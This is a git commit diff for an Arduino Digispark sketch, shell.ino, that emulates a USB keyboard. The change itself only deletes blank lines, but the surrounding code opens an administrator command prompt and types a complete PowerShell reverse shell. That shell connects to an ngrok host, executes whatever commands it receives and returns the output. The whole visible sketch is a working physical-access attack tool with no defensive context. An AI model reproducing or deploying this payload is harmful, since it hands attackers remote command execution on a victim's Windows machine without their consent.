b0d2171cb3e54085ad152d76641b26b7d2852173
Vinícius Bruno <91799009+Vinnybrunn00@users.noreply.github.com>
2023-05-25 18:46:00 -0300

    Update shell.ino

--- shell.ino
+++ shell.ino
@@ -1,5 +1,4 @@
 #include "DigiKeyboard.h"
-
 #define KEY_TAB 0x2b
 
 void setup() {
@@ -20,9 +19,7 @@ void StartAdminCMD(){
 void loop() {
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-
   StartAdminCMD();
-  
   DigiKeyboard.delay(1000);
   DigiKeyboard.println(F("powershell -command \"$client = New-Object System.Net.Sockets.TCPClient('0.tcp.sa.ngrok.io',14185);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); 
   DigiKeyboard.delay(5000);
